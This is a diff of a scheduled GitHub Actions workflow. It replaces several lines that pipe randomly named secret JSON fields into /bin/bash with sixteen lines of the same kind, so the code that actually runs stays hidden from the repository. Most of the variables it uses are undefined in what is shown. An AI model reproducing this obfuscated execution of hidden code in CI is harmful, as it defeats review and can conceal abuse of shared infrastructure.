@@ -3,20 +3,31 @@ name: tongxuevb
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 5/6 * * *'
-jobs:  # 9552
+    - cron: '5 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: tongxuevb
         env:
-          jq8: ${{ secrets.jq8 }}
+          kjcq630: ${{ secrets.kjcq630 }}
         run: |
-          echo $jq8 | jq -r .peywd99 | /bin/bash
-          echo $axwwn3 | jq -r .kpr403 | /bin/bash
-          echo $s59048 | jq -r .ntl69 | /bin/bash
-          echo $n59456 | jq -r .g8186 | /bin/bash
-          echo $awhsi6087 | jq -r .qiqr01208 | /bin/bash
-          echo $s11960 | jq -r .y2315 | /bin/bash
+          echo $kjcq630 | jq -r .toz0798 | /bin/bash
+          echo $qbwl4171 | jq -r .dp72 | /bin/bash
+          echo $kza60 | jq -r .ojzw87 | /bin/bash
+          echo $dlzjx0 | jq -r .ryz1 | /bin/bash
+          echo $x8 | jq -r .mvjmr893 | /bin/bash
+          echo $vrq42 | jq -r .zrfb7 | /bin/bash
+          echo $ok0 | jq -r .q806 | /bin/bash
+          echo $blrt5753 | jq -r .ksix1499 | /bin/bash
+          echo $vse5 | jq -r .e71947 | /bin/bash
+          echo $sxrw957 | jq -r .az9766 | /bin/bash
+          echo $rd70544 | jq -r .yb0220 | /bin/bash
+          echo $s83 | jq -r .p1 | /bin/bash
+          echo $yk67 | jq -r .x5215 | /bin/bash
+          echo $j08 | jq -r .bejd19 | /bin/bash
+          echo $mfw154 | jq -r .xdmq985 | /bin/bash
+          echo $xcntw3 | jq -r .zm711 | /bin/bash
 
